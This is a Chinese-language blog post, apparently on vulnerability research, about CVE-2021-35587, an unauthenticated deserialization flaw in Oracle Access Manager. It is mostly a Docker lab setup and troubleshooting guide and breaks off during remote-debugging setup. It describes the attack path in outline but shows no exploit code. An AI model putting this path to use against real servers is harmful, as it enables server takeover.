<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CVE-2021-35587：Oracle Access Manager反序列化漏洞 | 闲言语</title><meta name=keywords content><meta name=description content="漏洞概况 CVE公告
Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="CVE-2021-35587：Oracle Access Manager反序列化漏洞"><meta property="og:description" content="漏洞概况 CVE公告
Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-07-14T19:40:55+08:00"><meta property="article:modified_time" content="2022-07-14T19:40:55+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2021-35587：Oracle Access Manager反序列化漏洞"><meta name=twitter:description content="漏洞概况 CVE公告
Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"CVE-2021-35587：Oracle Access Manager反序列化漏洞","item":"https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2021-35587：Oracle Access Manager反序列化漏洞","name":"CVE-2021-35587：Oracle Access Manager反序列化漏洞","description":"漏洞概况 CVE公告\nVulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587","keywords":[],"articleBody":"漏洞概况 CVE公告\nVulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587\nOAM是什么\nOracle Access Manager (OAM) 提供身份管理（使用用户、组和机构管理、自助服务、流程管理功能和委托管理）、验证和授权服务，以及合规性报告。\n可以理解为Oracle生态中一套单点登陆系统。\nCVE-2021-35587能达成什么效果\n利用该漏洞，任意能够访问OAM的攻击者，无需认证即可攻占OAMServer。\nCVE-2021-35587的影响版本有哪些\n11.1.2.3.0, 12.2.1.3.0, 12.2.1.4.0\n——https://www.oracle.com/security-alerts/cpujan2022.html#AppendixFMW\n基本原理\n这是一个Java原生反序列化漏洞，接受和处理反序列化数据的接口是无认证的。\n因为OAM包含weblogic，所以反序列化过程可以借助weblogic的gadget达成任意Java代码执行，进而执行任意命令以攻占服务器，getshell和横向移动。\n本地搭建OAM 因为这是一套相对复杂的环境，所以搭建可用的OAM调试分析环境在利用CVE-2021-35587这个漏洞的过程中占据了相当大一部分时间。在这一点上，漏洞原作者和我有同样的体会。为了节省后来的分析者，以及以后的自己的宝贵的时间，我把OAM环境搭建方法和搭建过程中踩到的各种各样的坑总结在此。\n大纲 参考 https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background 使用方法2获取OAM镜像\nDownload a prebuilt OAM image from Oracle Container Registry by by navigating to Middleware \u003e oam. This image contains no patches and should only be used in Developer or Test environments. 下载到的OAM镜像用于跑起来三个OAM容器\nWebLogic Administration Server (AdminServer) OAM Managed Server (oam_server1) OAM Policy Manager Managed Server (oam_policy_mgr1) 跑起来这三个容器依赖一个可用的Oracle数据库\n步骤汇总 创建一台全新的Ubuntu18.04，切换到root用户。\n在 https://hub.docker.com/_/oracle-database-enterprise-edition 和 https://container-registry.oracle.com/ 登录账号后同意协议。（参考步骤二）\n安装docker\n1 2 # apt update # apt install docker.io docker 登录dockerhub 和 container-registry.oracle.com\n1 2 3 4 # ocker login 输入 login.docker.com 的账号密码\t# docker login container-registry.oracle.com 输入 login.oracle.com 的账号密码 拉取两个镜像\n1 2 # docker pull store/oracle/database-enterprise:12.2.0.1 # docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0 一些准备工作\n1 2 3 # docker network create -d bridge OamNET # mkdir -p /scratch/user_projects # chmod 777 /scratch/user_projects 启动四个容器（注意：将以下命令中的172.17.0.1替换为docker虚拟网卡网关的IP）\n1 2 3 4 docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" 查看各服务的IP地址\n1 docker inspect -f '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' oamadmin oamms oampolicy myOracleDB 使用以下链接访问服务。（注意：将192.168.0.105替换为虚拟机IP）\n1 2 3 4 5 6 7 账号：weblogic 密码：W3bl@gic WebLogic Administration Console http://192.168.0.105:7001/console Oracle Enterprise Manager Console http://192.168.0.105:7001/em Oracle Access Management Console http://192.168.0.105:7001/oamconsole OAM Server Logout http://192.168.0.105:14100/oam/server/logout Policy Manager Access http://192.168.0.105:15100/access ①运行Oracle数据库 创建Oracle数据库 参考 https://hub.docker.com/_/oracle-database-enterprise-edition 登陆账号后跳转到 https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070 ，同意协议。\n1 2 3 4 5 6 7 8 # sudo docker login 输入docker hub的账号密码 # sudo docker pull store/oracle/database-enterprise:12.2.0.1 拉取镜像 # sudo docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 运行起来一个Oracle数据库，并且开放到本地的1521端口 测试数据库连接 安装sqlplus 参考https://askubuntu.com/questions/159939/how-to-install-sqlplus\nstep1: 1 # sudo apt-get install alien step2: 在 https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html 下载3个文件 oracle-instantclient12.2-basic-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-sqlplus-12.2.0.1.0-1.x86_64.rpm oracle-instantclient12.2-devel-12.2.0.1.0-1.x86_64.rpm\nstep3: 1 2 3 # sudo alien -i oracle-instantclient*-basic*.rpm # sudo alien -i oracle-instantclient*-sqlplus*.rpm # sudo alien -i oracle-instantclient*-devel*.rpm step4: 1 # sudo apt-get install libaio1 step5: 1 2 # sudo sensible-editor /etc/ld.so.conf.d/oracle.conf 粘贴右侧内容： /usr/lib/oracle/12.2/client64/lib/ step6: sudo ldconfig\nstep7 测试链接 1 2 # sqlplus64 sys/Oradoc_db1@//127.0.0.1:1521/ORCLCDB.localdomain as sysdba # sqlplus64 sys/Oradoc_db1@//172.17.0.1:1521/ORCLPDB1.localdomain as sysdba 其他：sqlplus64的用法 sqlplus64的用法：sqlplus [ [] [{logon | /nolog}] [] ]\n其中 是\n1 {[/][@] | / } [AS {SYSDBA | SYSOPER | SYSASM | SYSBACKUP | SYSDG | SYSKM | SYSRAC}] [EDITION=value] 其中可以是如下格式 @[ | [//]Host[:Port]/]\n如何知道 service_name 或者 net_service_name？Oracle数据库容器镜像文档 说service_name定义在环境变量TNS_ADMIN定义的目录下的tnsnames.ora文件中， 进容器看到 TNS_ADMIN=/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB ，tnsnames.ora文件内容为\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) 所以 SERVICE_NAME 可以是 ORCLCDB.localdomain 或者 ORCLPDB1.localdomain 。\n②下载OAM镜像 进入 https://container-registry.oracle.com/ ，点击右上角Sign In，登陆自己的Oracle账号，然后点击MiddleWare，然后点击OAM。\n在右侧区域同意协议，然后才可以下载。\n否则即使docker login，还是无法下载，会提示\nError response from daemon: pull access denied for container-registry.oracle.com/middleware/oam, repository does not exist or may require ‘docker login’: denied: requested access to the resource is denied。\n同意协议之后执行以下命令\n1 # sudo docker login container-registry.oracle.com 输入在Oracle注册的账号密码\n1 # sudo docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0 ③创建容器一oamadmin 参考教程创建OAM Administration Server Container，其中包含WebLogic 和OAM Consoles.\n1 2 3 4 5 6 7 8 sudo docker images sudo docker network create -d bridge OamNET # 14f104a67b0819335f9490dadc3e4003540bcdbb7b19436b2aea56250a5f2713 sudo mkdir -p /scratch/user_projects sudo chmod 777 /scratch/user_projects sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 可能会连不上，使用以下命令调试，看看错误是什么\n1 sudo docker run --rm --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 报错及解决 报错一：无法连接数据库 1 2 Unable to connect to the database using the provided details. Enter a valid hostname and port or check if the listener is up and running 解决一：使用正确的IP 需要注意CONNECTION_STRING是从新建的容器中访问的，所以给的IP应该是容器网卡的网关或者主机的，比如 172.17.0.1，而不是127.0.0.1。\n报错二：无法连接CDB 1 The selected Oracle database is a multitenant container database (CDB). Connecting to a multitenant container database (CDB) is not supported. Instead, connect to a valid pluggable database (PDB). 解决二：使用PDB PDB和CDB是Oracle12的新特性，CDB是多租的。Oracle 数据库 12 c 多租户选项允许单个容器数据库 （CDB） 来承载多个单独的可插拔数据库 (PDB)。\n——https://www.cnblogs.com/kerrycode/p/3386917.html\n使用以下语句查看自己是否是所租数据库\n1 select name, decode(cdb, 'YES', 'Multitenant Option enabled', 'Regular 12c Database: ') \"Multitenant Option\" , open_mode, con_id from v$database; 结果\n1 2 3 NAME Multitenant Option OPEN_MODE CON_ID --------- -------------------------- -------------------- ---------- ORCLCDB Multitenant Option enabled READ WRITE 0 或者直接\n1 select cdb from v$database YES表示该数据库是CDB,如果是NO表示是NO-CDB(普通数据库)\n或者执行\n1 show pdbs; 结果\n1 2 3 CON_ID CON_NAME OPEN MODE RESTRICTED ---------- ------------------------------ ---------- ---------- 2 PDB$SEED READ ONLY NO 搜索 “how to connect to pdb directly” ，参考此文 想到通过新建服务连接到PDB。然后注意到/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB/tnsnames.ora 文件内容如下，其中已经包括两个Service。\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) 所以只要，创建容器时CONNECTION_STRING 使用 172.17.0.1:1521/ORCLPDB1.localdomain 而不是 172.17.0.1:1521/ORCLCDB.localdomain 就能解决这个错误。\n报错三：无法执行SQL 1 2 3 ERROR - RCU-6005 Unable to execute sql query. CAUSE - RCU-6005 Database not in open state. ACTION - RCU-6005 Make sure that the database is open. 解决三：打开PDB 为了解决报错而胡乱操作了数据库，其中一个动作关闭了PDB，从而导致了这个错误。打开它就好了。\nSQL\u003e select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 MOUNTED SQL\u003e alter pluggable database ORCLPDB1 open;\n1 Pluggable database altered. SQL\u003e select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 READ WRITE 报错四：创建domain失败 日志详情：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 DOMAIN_HOME=/u01/oracle/user_projects/domains/access_domain INFO: Admin Server not configured. Will run RCU and Domain Configuration Phase... Configuring Domain for first time Start the Admin and Managed Servers ===================================== Loading RCU Phase ================= CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 jdbc_url=jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Creating Domain 1st execution Loading RCU into database with RCUPREFIX OAM1 Domain Configuration Phase ========================== /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Cmd is /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Initializing WebLogic Scripting Tool (WLST) ... Welcome to WebLogic Server Administration Scripting Shell Type help() for help on available commands create_domain.py called with the following inputs: INFO: sys.argv[0] = /u01/oracle/dockertools/create_domain.py INFO: sys.argv[1] = -oh INFO: sys.argv[2] = /u01/oracle INFO: sys.argv[3] = -jh INFO: sys.argv[4] = /u01/jdk INFO: sys.argv[5] = -parent INFO: sys.argv[6] = /u01/oracle/user_projects/domains INFO: sys.argv[7] = -name INFO: sys.argv[8] = access_domain INFO: sys.argv[9] = -user INFO: sys.argv[10] = weblogic INFO: sys.argv[11] = -password INFO: sys.argv[12] = password INFO: sys.argv[13] = -rcuDb INFO: sys.argv[14] = 172.17.0.1:1521/ORCLPDB1.localdomain INFO: sys.argv[15] = -rcuPrefix INFO: sys.argv[16] = OAM1 INFO: sys.argv[17] = -rcuSchemaPwd INFO: sys.argv[18] = password INFO: sys.argv[19] = -isSSLEnabled INFO: sys.argv[20] = true INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Error: set() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \"/u01/oracle/dockertools/create_domain.py\", line 513, in ? File \"/u01/oracle/dockertools/create_domain.py\", line 123, in createOAMDomain File \"/u01/oracle/dockertools/create_domain.py\", line 184, in createBaseDomain File \"/tmp/WLSTOfflineIni5785928536971827845.py\", line 79, in set File \"/tmp/WLSTOfflineIni5785928536971827845.py\", line 19, in command at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException Domain Creation Failed.. Please check the Domain Logs 可以从48行看到是在 Creating Admin server... 阶段出错的。\n解决四：提高ADMIN_PASSWORD 密码复杂度 需要注意的是每次失败重试之前要先删除之前留下的痕迹。\n1 2 sudo docker rm oamadmin sudo rm -rf /scratch/user_projects/* 从这里 https://github.com/oracle/docker-images/issues/844#issuecomment-389884511 看到可能是密码复杂度不够，导致无法设置密码。\n启动容器的命令改为以下。将其中 ADMIN_PASSWORD 和 DB_SCHEMA_PASSWORD 的复杂度变高。\n其中ADMIN_PASSWORD 应该是weblogic管理台的密码。DB_SCHEMA_PASSWORD 是 password you want to set for the RCU schemas 。\n那么什么是RCU schemas 呢？什么是RCU呢？不太理解，先跳过。\nRepository Creation Utility is a graphical and CLI-based tool used to create and manage Oracle Fusion Middleware database schemas.\n改进两个密码的复杂度重新创建容器。\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Dbsch3m@ -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 并使用 sudo docker logs -ft oamadmin 查看新建过程打印出来的日志，看到问题得到了解决。\n报错五：创建domain失败 可以看到前几个步骤都顺利完成了，但也出现了新的问题。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 类似前文日志 INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Creating Node Managers... Will create Base domain at /u01/oracle/user_projects/domains/access_domain Writing base domain... Base domain created at /u01/oracle/user_projects/domains/access_domain Extending domain at /u01/oracle/user_projects/domains/access_domain Database 172.17.0.1:1521/ORCLPDB1.localdomain Apply Extension templates Extension Templates added Extension Templates added Deleting oam_server1 The default oam_server1 coming from the oam extension template deleted Deleting oam_policy_mgr1 The default oam_server1 coming from the oam extension template deleted Configuring JDBC Templates ... Configuring the Service Table DataSource... fmwDatabase jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Getting Database Defaults... Error: getDatabaseDefaults() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \"/u01/oracle/dockertools/create_domain.py\", line 513, in ? File \"/u01/oracle/dockertools/create_domain.py\", line 124, in createOAMDomain File \"/u01/oracle/dockertools/create_domain.py\", line 328, in extendOamDomain File \"/u01/oracle/dockertools/create_domain.py\", line 259, in configureJDBCTemplates File \"/tmp/WLSTOfflineIni7074819690261705056.py\", line 267, in getDatabaseDefaults File \"/tmp/WLSTOfflineIni7074819690261705056.py\", line 19, in command Failed to build JDBC Connection object: at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException: Got exception when auto configuring the schema component(s) with data obtained from shadow table: Failed to build JDBC Connection object: Domain Creation Failed.. Please check the Domain Logs 解决五：修改DB_SCHEMA_PASSWORD 从日志看到是在 Getting Database Defaults... 阶段出现的问题，搜索 getDatabaseDefaults() failed. Do dumpStack() to see details. 发现这个github issue有讨论。\n看到有人说是 schema password 的问题，于是随便改DB_SCHEMA_PASSWORD ，改成Oradoc_db1 还是不行，改成Oradoc_db2就可以了，我也不知道是什么原因😓不解\n总之呢，用这个命令，就可以跑起来三个容器中的第一个了！\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 成果 ④创建容器二oamms 1 sudo docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" ⑤创建容器三oampolicy 1 sudo docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" ⑥验证服务可用性 1 sudo docker inspect -f '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' oamadmin oamms oampolicy myOracleDB Console or Page URL WebLogic Administration Console http://:7001/console Oracle Enterprise Manager Console http://:7001/em Oracle Access Management Console http://:7001/oamconsole OAM Server Logout http://:14100/oam/server/logout Policy Manager Access http://:15100/access 各服务截图\n⑦启停与删除 启停\n1 2 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker start oamadmin oamms oampolicy myOracleDB 删除\n1 2 3 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker rm oamadmin oamms oampolicy myOracleDB sudo rm -rf /scratch/user_projects 远程调试OAM 本章节描述了拥有一个本地运行的OAM之后开启远程调试，以及从仅知道漏洞接口，到定位漏洞主机/容器、定位漏洞进程、定位漏洞代码、再到下载部署包和搭建调试项目，到最终能够顺利进行无源码远程调试的详细过程。其中也体现了Java web远程调试的基本流程和思路。\n大纲 OAM包括多个容器，我们需要先定位出来分析这个漏洞所需要关注的容器和进程，以调试模式重启该进程，将调试端口从容器中暴露给用于调试的主机，然后将对应进程的部署包和依赖包下载到调试主机，最后通过idea进行常规的Java web远程无源码动态调试。\n步骤汇总 参照 ”附录一：本地搭建OAM运行环境“ 的 ”步骤汇总“ 章节，但在 ”步骤汇总“ 章节中的第7步使用以下命令新建容器，在原命令基础上增加暴露出来容器的调试端口。 1 2 3 4 docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 8452:8453 -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env 